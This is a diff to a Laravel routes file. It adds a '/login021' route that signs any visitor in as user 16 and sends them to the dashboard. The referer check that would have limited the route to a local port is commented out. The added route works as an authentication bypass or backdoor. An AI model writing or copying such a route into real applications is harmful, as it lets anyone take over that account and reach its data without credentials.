@@ -20,6 +20,13 @@ use function foo\func;
 
 Auth::routes();
 
+Route::get('/login021', function (){
+    // if (strstr(\Request::server('HTTP_REFERER'), 'localhost:8001')){
+        \Auth::loginUsingId(16, true);
+        return redirect()->route('dashboard.index');
+    // }
+});
+
 Route::get('/lang/{locale}', function ($locale, Request $request) {
     \Cookie::queue('lang', $locale, 999999);
     return redirect()->back();
